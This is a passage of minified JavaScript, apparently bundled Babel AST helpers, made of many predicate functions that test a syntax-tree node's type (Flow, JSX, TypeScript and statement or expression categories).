LE(X,J){if(!X)return!1;if(X.type!=="DeclareFunction")return!1;return J==null||(0,D.default)(X,J)}function IE(X,J){if(!X)return!1;if(X.type!=="DeclareInterface")return!1;return J==null||(0,D.default)(X,J)}function CE(X,J){if(!X)return!1;if(X.type!=="DeclareModule")return!1;return J==null||(0,D.default)(X,J)}function PE(X,J){if(!X)return!1;if(X.type!=="DeclareModuleExports")return!1;return J==null||(0,D.default)(X,J)}function SE(X,J){if(!X)return!1;if(X.type!=="DeclareTypeAlias")return!1;return J==null||(0,D.default)(X,J)}function TE(X,J){if(!X)return!1;if(X.type!=="DeclareOpaqueType")return!1;return J==null||(0,D.default)(X,J)}function _E(X,J){if(!X)return!1;if(X.type!=="DeclareVariable")return!1;return J==null||(0,D.default)(X,J)}function EE(X,J){if(!X)return!1;if(X.type!=="DeclareExportDeclaration")return!1;return J==null||(0,D.default)(X,J)}function kE(X,J){if(!X)return!1;if(X.type!=="DeclareExportAllDeclaration")return!1;return J==null||(0,D.default)(X,J)}function bE(X,J){if(!X)return!1;if(X.type!=="DeclaredPredicate")return!1;return J==null||(0,D.default)(X,J)}function vE(X,J){if(!X)return!1;if(X.type!=="ExistsTypeAnnotation")return!1;return J==null||(0,D.default)(X,J)}function fE(X,J){if(!X)return!1;if(X.type!=="FunctionTypeAnnotation")return!1;return J==null||(0,D.default)(X,J)}function xE(X,J){if(!X)return!1;if(X.type!=="FunctionTypeParam")return!1;return J==null||(0,D.default)(X,J)}function hE(X,J){if(!X)return!1;if(X.type!=="GenericTypeAnnotation")return!1;return J==null||(0,D.default)(X,J)}function yE(X,J){if(!X)return!1;if(X.type!=="InferredPredicate")return!1;return J==null||(0,D.default)(X,J)}function gE(X,J){if(!X)return!1;if(X.type!=="InterfaceExtends")return!1;return J==null||(0,D.default)(X,J)}function mE(X,J){if(!X)return!1;if(X.type!=="InterfaceDeclaration")return!1;return J==null||(0,D.default)(X,J)}function uE(X,J){if(!X)return!1;if(X.type!=="InterfaceTypeAnnotation")return!1;return J==null||(0,D.default)(X,J)}function cE(X,J){if(!X)return!1;if(X.type!=="IntersectionTypeAnnotation")return!1;return J==null||(0,D.default)(X,J)}function lE(X,J){if(!X)return!1;if(X.type!=="MixedTypeAnnotation")return!1;return J==null||(0,D.default)(X,J)}function pE(X,J){if(!X)return!1;if(X.type!=="EmptyTypeAnnotation")return!1;return J==null||(0,D.default)(X,J)}function dE(X,J){if(!X)return!1;if(X.type!=="NullableTypeAnnotation")return!1;return J==null||(0,D.default)(X,J)}function iE(X,J){if(!X)return!1;if(X.type!=="NumberLiteralTypeAnnotation")return!1;return J==null||(0,D.default)(X,J)}function rE(X,J){if(!X)return!1;if(X.type!=="NumberTypeAnnotation")return!1;return J==null||(0,D.default)(X,J)}function aE(X,J){if(!X)return!1;if(X.type!=="ObjectTypeAnnotation")return!1;return J==null||(0,D.default)(X,J)}function nE(X,J){if(!X)return!1;if(X.type!=="ObjectTypeInternalSlot")return!1;return J==null||(0,D.default)(X,J)}function sE(X,J){if(!X)return!1;if(X.type!=="ObjectTypeCallProperty")return!1;return J==null||(0,D.default)(X,J)}function oE(X,J){if(!X)return!1;if(X.type!=="ObjectTypeIndexer")return!1;return J==null||(0,D.default)(X,J)}function tE(X,J){if(!X)return!1;if(X.type!=="ObjectTypeProperty")return!1;return J==null||(0,D.default)(X,J)}function eE(X,J){if(!X)return!1;if(X.type!=="ObjectTypeSpreadProperty")return!1;return J==null||(0,D.default)(X,J)}function Xk(X,J){if(!X)return!1;if(X.type!=="OpaqueType")return!1;return J==null||(0,D.default)(X,J)}function Jk(X,J){if(!X)return!1;if(X.type!=="QualifiedTypeIdentifier")return!1;return J==null||(0,D.default)(X,J)}function Qk(X,J){if(!X)return!1;if(X.type!=="StringLiteralTypeAnnotation")return!1;return J==null||(0,D.default)(X,J)}function Yk(X,J){if(!X)return!1;if(X.type!=="StringTypeAnnotation")return!1;return J==null||(0,D.default)(X,J)}function Wk(X,J){if(!X)return!1;if(X.type!=="SymbolTypeAnnotation")return!1;return J==null||(0,D.default)(X,J)}function Gk(X,J){if(!X)return!1;if(X.type!=="ThisTypeAnnotation")return!1;return J==null||(0,D.default)(X,J)}function Hk(X,J){if(!X)return!1;if(X.type!=="TupleTypeAnnotation")return!1;return J==null||(0,D.default)(X,J)}function zk(X,J){if(!X)return!1;if(X.type!=="TypeofTypeAnnotation")return!1;return J==null||(0,D.default)(X,J)}function $k(X,J){if(!X)return!1;if(X.type!=="TypeAlias")return!1;return J==null||(0,D.default)(X,J)}function Vk(X,J){if(!X)return!1;if(X.type!=="TypeAnnotation")return!1;return J==null||(0,D.default)(X,J)}function Kk(X,J){if(!X)return!1;if(X.type!=="TypeCastExpression")return!1;return J==null||(0,D.default)(X,J)}function Uk(X,J){if(!X)return!1;if(X.type!=="TypeParameter")return!1;return J==null||(0,D.default)(X,J)}function Zk(X,J){if(!X)return!1;if(X.type!=="TypeParameterDeclaration")return!1;return J==null||(0,D.default)(X,J)}function qk(X,J){if(!X)return!1;if(X.type!=="TypeParameterInstantiation")return!1;return J==null||(0,D.default)(X,J)}function Bk(X,J){if(!X)return!1;if(X.type!=="UnionTypeAnnotation")return!1;return J==null||(0,D.default)(X,J)}function Mk(X,J){if(!X)return!1;if(X.type!=="Variance")return!1;return J==null||(0,D.default)(X,J)}function jk(X,J){if(!X)return!1;if(X.type!=="VoidTypeAnnotation")return!1;return J==null||(0,D.default)(X,J)}function Ok(X,J){if(!X)return!1;if(X.type!=="EnumDeclaration")return!1;return J==null||(0,D.default)(X,J)}function Fk(X,J){if(!X)return!1;if(X.type!=="EnumBooleanBody")return!1;return J==null||(0,D.default)(X,J)}function Rk(X,J){if(!X)return!1;if(X.type!=="EnumNumberBody")return!1;return J==null||(0,D.default)(X,J)}function Ak(X,J){if(!X)return!1;if(X.type!=="EnumStringBody")return!1;return J==null||(0,D.default)(X,J)}function Dk(X,J){if(!X)return!1;if(X.type!=="EnumSymbolBody")return!1;return J==null||(0,D.default)(X,J)}function wk(X,J){if(!X)return!1;if(X.type!=="EnumBooleanMember")return!1;return J==null||(0,D.default)(X,J)}function Nk(X,J){if(!X)return!1;if(X.type!=="EnumNumberMember")return!1;return J==null||(0,D.default)(X,J)}function Lk(X,J){if(!X)return!1;if(X.type!=="EnumStringMember")return!1;return J==null||(0,D.default)(X,J)}function Ik(X,J){if(!X)return!1;if(X.type!=="EnumDefaultedMember")return!1;return J==null||(0,D.default)(X,J)}function Ck(X,J){if(!X)return!1;if(X.type!=="IndexedAccessType")return!1;return J==null||(0,D.default)(X,J)}function Pk(X,J){if(!X)return!1;if(X.type!=="OptionalIndexedAccessType")return!1;return J==null||(0,D.default)(X,J)}function Sk(X,J){if(!X)return!1;if(X.type!=="JSXAttribute")return!1;return J==null||(0,D.default)(X,J)}function Tk(X,J){if(!X)return!1;if(X.type!=="JSXClosingElement")return!1;return J==null||(0,D.default)(X,J)}function _k(X,J){if(!X)return!1;if(X.type!=="JSXElement")return!1;return J==null||(0,D.default)(X,J)}function Ek(X,J){if(!X)return!1;if(X.type!=="JSXEmptyExpression")return!1;return J==null||(0,D.default)(X,J)}function kk(X,J){if(!X)return!1;if(X.type!=="JSXExpressionContainer")return!1;return J==null||(0,D.default)(X,J)}function bk(X,J){if(!X)return!1;if(X.type!=="JSXSpreadChild")return!1;return J==null||(0,D.default)(X,J)}function vk(X,J){if(!X)return!1;if(X.type!=="JSXIdentifier")return!1;return J==null||(0,D.default)(X,J)}function fk(X,J){if(!X)return!1;if(X.type!=="JSXMemberExpression")return!1;return J==null||(0,D.default)(X,J)}function xk(X,J){if(!X)return!1;if(X.type!=="JSXNamespacedName")return!1;return J==null||(0,D.default)(X,J)}function hk(X,J){if(!X)return!1;if(X.type!=="JSXOpeningElement")return!1;return J==null||(0,D.default)(X,J)}function yk(X,J){if(!X)return!1;if(X.type!=="JSXSpreadAttribute")return!1;return J==null||(0,D.default)(X,J)}function gk(X,J){if(!X)return!1;if(X.type!=="JSXText")return!1;return J==null||(0,D.default)(X,J)}function mk(X,J){if(!X)return!1;if(X.type!=="JSXFragment")return!1;return J==null||(0,D.default)(X,J)}function uk(X,J){if(!X)return!1;if(X.type!=="JSXOpeningFragment")return!1;return J==null||(0,D.default)(X,J)}function ck(X,J){if(!X)return!1;if(X.type!=="JSXClosingFragment")return!1;return J==null||(0,D.default)(X,J)}function lk(X,J){if(!X)return!1;if(X.type!=="Noop")return!1;return J==null||(0,D.default)(X,J)}function pk(X,J){if(!X)return!1;if(X.type!=="Placeholder")return!1;return J==null||(0,D.default)(X,J)}function dk(X,J){if(!X)return!1;if(X.type!=="V8IntrinsicIdentifier")return!1;return J==null||(0,D.default)(X,J)}function ik(X,J){if(!X)return!1;if(X.type!=="ArgumentPlaceholder")return!1;return J==null||(0,D.default)(X,J)}function rk(X,J){if(!X)return!1;if(X.type!=="BindExpression")return!1;return J==null||(0,D.default)(X,J)}function ak(X,J){if(!X)return!1;if(X.type!=="Decorator")return!1;return J==null||(0,D.default)(X,J)}function nk(X,J){if(!X)return!1;if(X.type!=="DoExpression")return!1;return J==null||(0,D.default)(X,J)}function sk(X,J){if(!X)return!1;if(X.type!=="ExportDefaultSpecifier")return!1;return J==null||(0,D.default)(X,J)}function ok(X,J){if(!X)return!1;if(X.type!=="RecordExpression")return!1;return J==null||(0,D.default)(X,J)}function tk(X,J){if(!X)return!1;if(X.type!=="TupleExpression")return!1;return J==null||(0,D.default)(X,J)}function ek(X,J){if(!X)return!1;if(X.type!=="DecimalLiteral")return!1;return J==null||(0,D.default)(X,J)}function Xb(X,J){if(!X)return!1;if(X.type!=="ModuleExpression")return!1;return J==null||(0,D.default)(X,J)}function Jb(X,J){if(!X)return!1;if(X.type!=="TopicReference")return!1;return J==null||(0,D.default)(X,J)}function Qb(X,J){if(!X)return!1;if(X.type!=="PipelineTopicExpression")return!1;return J==null||(0,D.default)(X,J)}function Yb(X,J){if(!X)return!1;if(X.type!=="PipelineBareFunction")return!1;return J==null||(0,D.default)(X,J)}function Wb(X,J){if(!X)return!1;if(X.type!=="PipelinePrimaryTopicReference")return!1;return J==null||(0,D.default)(X,J)}function Gb(X,J){if(!X)return!1;if(X.type!=="VoidPattern")return!1;return J==null||(0,D.default)(X,J)}function Hb(X,J){if(!X)return!1;if(X.type!=="TSParameterProperty")return!1;return J==null||(0,D.default)(X,J)}function zb(X,J){if(!X)return!1;if(X.type!=="TSDeclareFunction")return!1;return J==null||(0,D.default)(X,J)}function $b(X,J){if(!X)return!1;if(X.type!=="TSDeclareMethod")return!1;return J==null||(0,D.default)(X,J)}function Vb(X,J){if(!X)return!1;if(X.type!=="TSQualifiedName")return!1;return J==null||(0,D.default)(X,J)}function Kb(X,J){if(!X)return!1;if(X.type!=="TSCallSignatureDeclaration")return!1;return J==null||(0,D.default)(X,J)}function Ub(X,J){if(!X)return!1;if(X.type!=="TSConstructSignatureDeclaration")return!1;return J==null||(0,D.default)(X,J)}function Zb(X,J){if(!X)return!1;if(X.type!=="TSPropertySignature")return!1;return J==null||(0,D.default)(X,J)}function qb(X,J){if(!X)return!1;if(X.type!=="TSMethodSignature")return!1;return J==null||(0,D.default)(X,J)}function Bb(X,J){if(!X)return!1;if(X.type!=="TSIndexSignature")return!1;return J==null||(0,D.default)(X,J)}function Mb(X,J){if(!X)return!1;if(X.type!=="TSAnyKeyword")return!1;return J==null||(0,D.default)(X,J)}function jb(X,J){if(!X)return!1;if(X.type!=="TSBooleanKeyword")return!1;return J==null||(0,D.default)(X,J)}function Ob(X,J){if(!X)return!1;if(X.type!=="TSBigIntKeyword")return!1;return J==null||(0,D.default)(X,J)}function Fb(X,J){if(!X)return!1;if(X.type!=="TSIntrinsicKeyword")return!1;return J==null||(0,D.default)(X,J)}function Rb(X,J){if(!X)return!1;if(X.type!=="TSNeverKeyword")return!1;return J==null||(0,D.default)(X,J)}function Ab(X,J){if(!X)return!1;if(X.type!=="TSNullKeyword")return!1;return J==null||(0,D.default)(X,J)}function Db(X,J){if(!X)return!1;if(X.type!=="TSNumberKeyword")return!1;return J==null||(0,D.default)(X,J)}function wb(X,J){if(!X)return!1;if(X.type!=="TSObjectKeyword")return!1;return J==null||(0,D.default)(X,J)}function Nb(X,J){if(!X)return!1;if(X.type!=="TSStringKeyword")return!1;return J==null||(0,D.default)(X,J)}function Lb(X,J){if(!X)return!1;if(X.type!=="TSSymbolKeyword")return!1;return J==null||(0,D.default)(X,J)}function Ib(X,J){if(!X)return!1;if(X.type!=="TSUndefinedKeyword")return!1;return J==null||(0,D.default)(X,J)}function Cb(X,J){if(!X)return!1;if(X.type!=="TSUnknownKeyword")return!1;return J==null||(0,D.default)(X,J)}function Pb(X,J){if(!X)return!1;if(X.type!=="TSVoidKeyword")return!1;return J==null||(0,D.default)(X,J)}function Sb(X,J){if(!X)return!1;if(X.type!=="TSThisType")return!1;return J==null||(0,D.default)(X,J)}function Tb(X,J){if(!X)return!1;if(X.type!=="TSFunctionType")return!1;return J==null||(0,D.default)(X,J)}function _b(X,J){if(!X)return!1;if(X.type!=="TSConstructorType")return!1;return J==null||(0,D.default)(X,J)}function Eb(X,J){if(!X)return!1;if(X.type!=="TSTypeReference")return!1;return J==null||(0,D.default)(X,J)}function kb(X,J){if(!X)return!1;if(X.type!=="TSTypePredicate")return!1;return J==null||(0,D.default)(X,J)}function bb(X,J){if(!X)return!1;if(X.type!=="TSTypeQuery")return!1;return J==null||(0,D.default)(X,J)}function vb(X,J){if(!X)return!1;if(X.type!=="TSTypeLiteral")return!1;return J==null||(0,D.default)(X,J)}function fb(X,J){if(!X)return!1;if(X.type!=="TSArrayType")return!1;return J==null||(0,D.default)(X,J)}function xb(X,J){if(!X)return!1;if(X.type!=="TSTupleType")return!1;return J==null||(0,D.default)(X,J)}function hb(X,J){if(!X)return!1;if(X.type!=="TSOptionalType")return!1;return J==null||(0,D.default)(X,J)}function yb(X,J){if(!X)return!1;if(X.type!=="TSRestType")return!1;return J==null||(0,D.default)(X,J)}function gb(X,J){if(!X)return!1;if(X.type!=="TSNamedTupleMember")return!1;return J==null||(0,D.default)(X,J)}function mb(X,J){if(!X)return!1;if(X.type!=="TSUnionType")return!1;return J==null||(0,D.default)(X,J)}function ub(X,J){if(!X)return!1;if(X.type!=="TSIntersectionType")return!1;return J==null||(0,D.default)(X,J)}function cb(X,J){if(!X)return!1;if(X.type!=="TSConditionalType")return!1;return J==null||(0,D.default)(X,J)}function lb(X,J){if(!X)return!1;if(X.type!=="TSInferType")return!1;return J==null||(0,D.default)(X,J)}function pb(X,J){if(!X)return!1;if(X.type!=="TSParenthesizedType")return!1;return J==null||(0,D.default)(X,J)}function db(X,J){if(!X)return!1;if(X.type!=="TSTypeOperator")return!1;return J==null||(0,D.default)(X,J)}function ib(X,J){if(!X)return!1;if(X.type!=="TSIndexedAccessType")return!1;return J==null||(0,D.default)(X,J)}function rb(X,J){if(!X)return!1;if(X.type!=="TSMappedType")return!1;return J==null||(0,D.default)(X,J)}function ab(X,J){if(!X)return!1;if(X.type!=="TSTemplateLiteralType")return!1;return J==null||(0,D.default)(X,J)}function nb(X,J){if(!X)return!1;if(X.type!=="TSLiteralType")return!1;return J==null||(0,D.default)(X,J)}function sb(X,J){if(!X)return!1;if(X.type!=="TSExpressionWithTypeArguments")return!1;return J==null||(0,D.default)(X,J)}function ob(X,J){if(!X)return!1;if(X.type!=="TSInterfaceDeclaration")return!1;return J==null||(0,D.default)(X,J)}function tb(X,J){if(!X)return!1;if(X.type!=="TSInterfaceBody")return!1;return J==null||(0,D.default)(X,J)}function eb(X,J){if(!X)return!1;if(X.type!=="TSTypeAliasDeclaration")return!1;return J==null||(0,D.default)(X,J)}function Xv(X,J){if(!X)return!1;if(X.type!=="TSInstantiationExpression")return!1;return J==null||(0,D.default)(X,J)}function Jv(X,J){if(!X)return!1;if(X.type!=="TSAsExpression")return!1;return J==null||(0,D.default)(X,J)}function Qv(X,J){if(!X)return!1;if(X.type!=="TSSatisfiesExpression")return!1;return J==null||(0,D.default)(X,J)}function Yv(X,J){if(!X)return!1;if(X.type!=="TSTypeAssertion")return!1;return J==null||(0,D.default)(X,J)}function Wv(X,J){if(!X)return!1;if(X.type!=="TSEnumBody")return!1;return J==null||(0,D.default)(X,J)}function Gv(X,J){if(!X)return!1;if(X.type!=="TSEnumDeclaration")return!1;return J==null||(0,D.default)(X,J)}function Hv(X,J){if(!X)return!1;if(X.type!=="TSEnumMember")return!1;return J==null||(0,D.default)(X,J)}function zv(X,J){if(!X)return!1;if(X.type!=="TSModuleDeclaration")return!1;return J==null||(0,D.default)(X,J)}function $v(X,J){if(!X)return!1;if(X.type!=="TSModuleBlock")return!1;return J==null||(0,D.default)(X,J)}function Vv(X,J){if(!X)return!1;if(X.type!=="TSImportType")return!1;return J==null||(0,D.default)(X,J)}function Kv(X,J){if(!X)return!1;if(X.type!=="TSImportEqualsDeclaration")return!1;return J==null||(0,D.default)(X,J)}function Uv(X,J){if(!X)return!1;if(X.type!=="TSExternalModuleReference")return!1;return J==null||(0,D.default)(X,J)}function Zv(X,J){if(!X)return!1;if(X.type!=="TSNonNullExpression")return!1;return J==null||(0,D.default)(X,J)}function qv(X,J){if(!X)return!1;if(X.type!=="TSExportAssignment")return!1;return J==null||(0,D.default)(X,J)}function Bv(X,J){if(!X)return!1;if(X.type!=="TSNamespaceExportDeclaration")return!1;return J==null||(0,D.default)(X,J)}function Mv(X,J){if(!X)return!1;if(X.type!=="TSTypeAnnotation")return!1;return J==null||(0,D.default)(X,J)}function jv(X,J){if(!X)return!1;if(X.type!=="TSTypeParameterInstantiation")return!1;return J==null||(0,D.default)(X,J)}function Ov(X,J){if(!X)return!1;if(X.type!=="TSTypeParameterDeclaration")return!1;return J==null||(0,D.default)(X,J)}function Fv(X,J){if(!X)return!1;if(X.type!=="TSTypeParameter")return!1;return J==null||(0,D.default)(X,J)}function Rv(X,J){if(!X)return!1;switch(X.type){case"ArrayExpression":case"AssignmentExpression":case"BinaryExpression":case"InterpreterDirective":case"Directive":case"DirectiveLiteral":case"BlockStatement":case"BreakStatement":case"CallExpression":case"CatchClause":case"ConditionalExpression":case"ContinueStatement":case"DebuggerStatement":case"DoWhileStatement":case"EmptyStatement":case"ExpressionStatement":case"File":case"ForInStatement":case"ForStatement":case"FunctionDeclaration":case"FunctionExpression":case"Identifier":case"IfStatement":case"LabeledStatement":case"StringLiteral":case"NumericLiteral":case"NullLiteral":case"BooleanLiteral":case"RegExpLiteral":case"LogicalExpression":case"MemberExpression":case"NewExpression":case"Program":case"ObjectExpression":case"ObjectMethod":case"ObjectProperty":case"RestElement":case"ReturnStatement":case"SequenceExpression":case"ParenthesizedExpression":case"SwitchCase":case"SwitchStatement":case"ThisExpression":case"ThrowStatement":case"TryStatement":case"UnaryExpression":case"UpdateExpression":case"VariableDeclaration":case"VariableDeclarator":case"WhileStatement":case"WithStatement":case"AssignmentPattern":case"ArrayPattern":case"ArrowFunctionExpression":case"ClassBody":case"ClassExpression":case"ClassDeclaration":case"ExportAllDeclaration":case"ExportDefaultDeclaration":case"ExportNamedDeclaration":case"ExportSpecifier":case"ForOfStatement":case"ImportDeclaration":case"ImportDefaultSpecifier":case"ImportNamespaceSpecifier":case"ImportSpecifier":case"ImportExpression":case"MetaProperty":case"ClassMethod":case"ObjectPattern":case"SpreadElement":case"Super":case"TaggedTemplateExpression":case"TemplateElement":case"TemplateLiteral":case"YieldExpression":case"AwaitExpression":case"Import":case"BigIntLiteral":case"ExportNamespaceSpecifier":case"OptionalMemberExpression":case"OptionalCallExpression":case"ClassProperty":case"ClassAccessorProperty":case"ClassPrivateProperty":case"ClassPrivateMethod":case"PrivateName":case"StaticBlock":case"ImportAttribute":break;case"Placeholder":switch(X.expectedNode){case"Identifier":case"StringLiteral":case"BlockStatement":case"ClassBody":break;default:return!1}break;default:return!1}return J==null||(0,D.default)(X,J)}function Av(X,J){if(!X)return!1;switch(X.type){case"ArrayExpression":case"AssignmentExpression":case"BinaryExpression":case"CallExpression":case"ConditionalExpression":case"FunctionExpression":case"Identifier":case"StringLiteral":case"NumericLiteral":case"NullLiteral":case"BooleanLiteral":case"RegExpLiteral":case"LogicalExpression":case"MemberExpression":case"NewExpression":case"ObjectExpression":case"SequenceExpression":case"ParenthesizedExpression":case"ThisExpression":case"UnaryExpression":case"UpdateExpression":case"ArrowFunctionExpression":case"ClassExpression":case"ImportExpression":case"MetaProperty":case"Super":case"TaggedTemplateExpression":case"TemplateLiteral":case"YieldExpression":case"AwaitExpression":case"Import":case"BigIntLiteral":case"OptionalMemberExpression":case"OptionalCallExpression":case"TypeCastExpression":case"JSXElement":case"JSXFragment":case"BindExpression":case"DoExpression":case"RecordExpression":case"TupleExpression":case"DecimalLiteral":case"ModuleExpression":case"TopicReference":case"PipelineTopicExpression":case"PipelineBareFunction":case"PipelinePrimaryTopicReference":case"TSInstantiationExpression":case"TSAsExpression":case"TSSatisfiesExpression":case"TSTypeAssertion":case"TSNonNullExpression":break;case"Placeholder":switch(X.expectedNode){case"Expression":case"Identifier":case"StringLiteral":break;default:return!1}break;default:return!1}return J==null||(0,D.default)(X,J)}function Dv(X,J){if(!X)return!1;switch(X.type){case"BinaryExpression":case"LogicalExpression":break;default:return!1}return J==null||(0,D.default)(X,J)}function wv(X,J){if(!X)return!1;switch(X.type){case"BlockStatement":case"CatchClause":case"DoWhileStatement":case"ForInStatement":case"ForStatement":case"FunctionDeclaration":case"FunctionExpression":case"Program":case"ObjectMethod":case"SwitchStatement":case"WhileStatement":case"ArrowFunctionExpression":case"ClassExpression":case"ClassDeclaration":case"ForOfStatement":case"ClassMethod":case"ClassPrivateMethod":case"StaticBlock":case"TSModuleBlock":break;case"Placeholder":if(X.expectedNode==="BlockStatement")break;default:return!1}return J==null||(0,D.default)(X,J)}function Nv(X,J){if(!X)return!1;switch(X.type){case"BlockStatement":case"CatchClause":case"DoWhileStatement":case"ForInStatement":case"ForStatement":case"FunctionDeclaration":case"FunctionExpression":case"Program":case"ObjectMethod":case"SwitchStatement":case"WhileStatement":case"ArrowFunctionExpression":case"ForOfStatement":case"ClassMethod":case"ClassPrivateMethod":case"StaticBlock":case"TSModuleBlock":break;case"Placeholder":if(X.expectedNode==="BlockStatement")break;default:return!1}return J==null||(0,D.default)(X,J)}function Lv(X,J){if(!X)return!1;switch(X.type){case"BlockStatement":case"Program":case"TSModuleBlock":break;case"Placeholder":if(X.expectedNode==="BlockStatement")break;default:return!1}return J==null||(0,D.default)(X,J)}function Iv(X,J){if(!X)return!1;switch(X.type){case"BlockStatement":case"BreakStatement":case"ContinueStatement":case"DebuggerStatement":case"DoWhileStatement":case"EmptyStatement":case"ExpressionStatement":case"ForInStatement":case"ForStatement":case"FunctionDeclaration":case"IfStatement":case"LabeledStatement":case"ReturnStatement":case"SwitchStatement":case"ThrowStatement":case"TryStatement":case"VariableDeclaration":case"WhileStatement":case"WithStatement":case"ClassDeclaration":case"ExportAllDeclaration":case"ExportDefaultDeclaration":case"ExportNamedDeclaration":case"ForOfStatement":case"ImportDeclaration":case"DeclareClass":case"DeclareFunction":case"DeclareInterface":case"DeclareModule":case"DeclareModuleExports":case"DeclareTypeAlias":case"DeclareOpaqueType":case"DeclareVariable":case"DeclareExportDeclaration":case"DeclareExportAllDeclaration":case"InterfaceDeclaration":case"OpaqueType":case"TypeAlias":case"EnumDeclaration":case"TSDeclareFunction":case"TSInterfaceDeclaration":case"TSTypeAliasDeclaration":case"TSEnumDeclaration":case"TSModuleDeclaration":case"TSImportEqualsDeclaration":case"TSExportAssignment":case"TSNamespaceExportDeclaration":break;case"Placeholder":switch(X.expectedNode){case"Statement":case"Declaration":case"BlockStatement":break;default:return!1}break;default:return!1}return J==null||(0,D.default)(X,J)}function Cv(X,J){if(!X)return!1;switch(X.type){case"BreakStatement":case"ContinueStatement":case"ReturnStatement":case"ThrowStatement":case"YieldExpression":case"AwaitExpression":break;default:return!1}return J==null||(0,D.default)(X,J)}function Pv(X,J){if(!X)return!1;switch(X.type){case"BreakStatement":case"ContinueStatement":case"ReturnStatement":case"ThrowStatement":break;default:return!1}return J==null||(0,D.default)(X,J)}function Sv(X,J){if(!X)return!1;switch(X.type){case"ConditionalExpression":case"IfStatement":break;default:return!1}return J==null||(0,D.default)(X,J)}function Tv(X,J){if(!X)return!1;switch(X.type){case"DoWhileStatement":case"ForInStatement":case"ForStatement":case"WhileStatement":case"ForOfStatement":break;default:return!1}return J==null||(0,D.default)(X,J)}function _v(X,J){if(!X)return!1;switch(X.type){case"DoWhileStatement":case"WhileStatement":break;default:return!1}return J==null||(0,D.default)(X,J)}function Ev(X,J){if(!X)return!1;switch(X.type){case"ExpressionStatement":case"ParenthesizedExpression":case"TypeCastExpression":break;default:return!1}return J==null||(0,D.default)(X,J)}function kv(X,J){if(!X)return!1;switch(X.type){case"ForInStatement":case"ForStatement":case"ForOfStatement":break;default:return!1}return J==null||(0,D.default)(X,J)}function bv(X,J){if(!X)return!1;switch(X.type){case"ForInStatement":case"ForOfStatement":break;default:return!1}return J==null||(0,D.default)(X,J)}function vv(X,J){if(!X)return!1;switch(X.type){case"FunctionDeclaration":case"FunctionExpression":case"ObjectMethod":case"ArrowFunctionExpression":case"ClassMethod":case"ClassPrivateMethod":break;default:return!1}return J==null||(0,D.default)(X,J)}function fv(X,J){if(!X)return!1;switch(X.type){case"FunctionDeclaration":case"FunctionExpression":case"ObjectMethod":case"ArrowFunctionExpression":case"ClassMethod":case"ClassPrivateMethod":case"StaticBlock":case"TSModuleBlock":break;default:return!1}return J==null||(0,D.default)(X,J)}function xv(X,J){if(!X)return!1;switch(X.type){case"FunctionDeclaration":case"FunctionExpression":case"StringLiteral":case"NumericLiteral":case"NullLiteral":case"BooleanLiteral":case"RegExpLiteral":case"ArrowFunctionExpression":case"BigIntLiteral":case"DecimalLiteral":break;case"Placeholder":if(X.expectedNode==="StringLiteral")break;default:return!1}return J==null||(0,D.default)(X,J)}function hv(X,J){if(!X)return!1;switch(X.type){case"FunctionDeclaration":case"VariableDeclaration":case"ClassDeclaration":case"ExportAllDeclaration":case"ExportDefaultDeclaration":case"ExportNamedDeclaration":case"ImportDeclaration":case"DeclareClass":case"DeclareFunction":case"DeclareInterface":case"DeclareModule":case"DeclareModuleExports":case"DeclareTypeAlias":case"DeclareOpaqueType":case"DeclareVariable":case"DeclareExportDeclaration":case"DeclareExportAllDeclaration":case"InterfaceDeclaration":case"OpaqueType":case"TypeAlias":case"EnumDeclaration":case"TSDeclareFunction":case"TSInterfaceDeclaration":case"TSTypeAliasDeclaration":case"TSEnumDeclaration":case"TSModuleDeclaration":case"TSImportEqualsDeclaration":break;case"Placeholder":if(X.expectedNode==="Declaration")break;default:return!1}return J==null||(0,D.default)(X,J)}function yv(X,J){if(!X)return!1;switch(X.type){case"Identifier":case"RestElement":case"AssignmentPattern":case"ArrayPattern":case"ObjectPattern":case"VoidPattern":break;case"Placeholder":if(X.expectedNode==="Identifier")break;default:return!1}return J==null||(0,D.default)(X,J)}function gv(X,J){if(!X)return!1;switch(X.type){case"Identifier":case"MemberExpression":case"RestElement":case"AssignmentPattern":case"ArrayPattern":case"ObjectPattern":case"VoidPattern":case"TSAsExpression":case"TSSatisfiesExpression":case"TSTypeAssertion":case"TSNonNullExpression":break;case"Placeholder":switch(X.expectedNode){case"Pattern":case"Identifier":break;default:return!1}break;default:return!1}return J==null||(0,D.default)(X,J)}function mv(X,J){if(!X)return!1;switch(X.type){case"Identifier":case"MemberExpression":case"RestElement":case"AssignmentPattern":case"ArrayPattern":case"ObjectPattern":case"TSParameterProperty":case"TSAsExpression":case"TSSatisfiesExpression":case"TSTypeAssertion":case"TSNonNullExpression":break;case"Placeholder":switch(X.expectedNode){case"Pattern":case"Identifier":break;default:return!1}break;default:return!1}return J==null||(0,D.default)(X,J)}function uv(X,J){if(!X)return!1;switch(X.type){case"Identifier":case"TSQualifiedName":break;case"Placeholder":if(X.expectedNode==="Identifier")break;default:return!1}return J==null||(0,D.default)(X,J)}function cv(X,J){if(!X)return!1;switch(X.type){case"StringLiteral":case"NumericLiteral":case"NullLiteral":case"BooleanLiteral":case"RegExpLiteral":case"TemplateLiteral":case"BigIntLiteral":case"DecimalLiteral":break;case"Placeholder":if(X.expectedNode==="StringLiteral")break;default:return!1}return J==null||(0,D.default)(X,J)}function lv(X,J){if(!X)return!1;switch(X.type){case"StringLiteral":case"NumericLiteral":case"NullLiteral":case"BooleanLiteral":case"BigIntLiteral":case"JSXAttribute":case"JSXClosingElement":case"JSXElement":case"JSXExpressionContainer":case"JSXSpreadChild":case"JSXOpeningElement":case"JSXText":case"JSXFragment":case"JSXOpeningFragment":case"JSXClosingFragment":case"DecimalLiteral":break;case"Placeholder":if(X.expectedNode==="StringLiteral")break;default:return!1}return J==null||(0,D.default)(X,J)}function pv(X,J){if(!X)return!1;switch(X.type){case"ObjectMethod":case"ObjectProperty":case"ObjectTypeInternalSlot":case"ObjectTypeCallProperty":case"ObjectTypeIndexer":case"ObjectTypeProperty":case"ObjectTypeSpreadProperty":break;default:return!1}return J==null||(0,D.default)(X,J)}function dv(X,J){if(!X)return!1;switch(X.type){case"ObjectMethod":case"ClassMethod":case"ClassPrivateMethod":break;default:return!1}return J==null||(0,D.default)(X,J)}function iv(X,J){if(!X)return!1;switch(X.type){case"ObjectMethod":case"ObjectProperty":break;default:return!1}return J==null||(0,D.default)(X,J)}function rv(X,J){if(!X)return!1;switch(X.type){case"ObjectProperty":case"ClassProperty":case"ClassAccessorProperty":case"ClassPrivateProperty":break;default:return!1}return J==null||(0,D.default)(X,J)}function av(X,J){if(!X)return!1;switch(X.type){case"UnaryExpression":case"SpreadElement":break;default:return!1}return 